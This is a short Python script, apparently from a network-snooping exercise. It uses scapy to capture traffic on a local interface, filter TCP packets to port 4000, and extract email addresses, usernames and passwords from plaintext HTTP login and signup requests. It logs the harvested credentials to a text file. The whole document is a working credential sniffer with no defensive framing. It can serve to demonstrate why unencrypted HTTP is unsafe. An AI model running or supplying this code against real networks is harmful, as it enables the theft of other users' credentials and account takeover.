from scapy.all import *

interface = 'Ethernet 9'
methods = ['GET', 'POST']
file_path = 'hhtp Snooping/LAN_info.txt'
msg = ''

def main():
    while True:
        s = sniff(20, iface=interface) # 20 count since it might miss some packets if count too low 

        msg = ''
        correct_port = []
        for packet in s:
            if packet.haslayer(TCP): # Check if packet has Transmission Contorl Protocol 
                if packet.dport == 4000:
                    correct_port.append(packet)

        for packet in correct_port: 
            if packet.haslayer(Raw): # Check if packet have raw text
                #print(packet)
                #print(str(packet.load))
                raw_packet = str(packet.load) # load raw text

                # Filter packet that have /login or /signup in the raw data
                if '/login' in raw_packet:
                    if "password" in raw_packet:
                        email_index = raw_packet.find('email')
                        password_index = raw_packet.find('password')

                        email = raw_packet[email_index:password_index-1].replace('%40', '@')
                        password = raw_packet[password_index:].replace('%40', '@')
                        msg += f'Login:\n{email}\n{password}'
                elif '/signup' in raw_packet:
                    if "password" in raw_packet:

                        username_index = raw_packet.find('username')
                        email_index = raw_packet.find('email')
                        password_index = raw_packet.find('password')

                        username = raw_packet[username_index:email_index-1].replace('%40', '@')
                        email = raw_packet[email_index:password_index-1].replace('%40', '@')
                        password = raw_packet[password_index:].replace('%40', '@')
                        msg += f'Signup:\n{username}\n{email}\n{password}'
        
        with open(file_path, 'a', encoding='utf-8') as read_file:
            read_file.write(msg+'\n') # Print the raw text (similar when following stream)


if __name__ == '__main__':
    with open(file_path, 'w', encoding='UTF-8') as f:
        pass
    main()
        

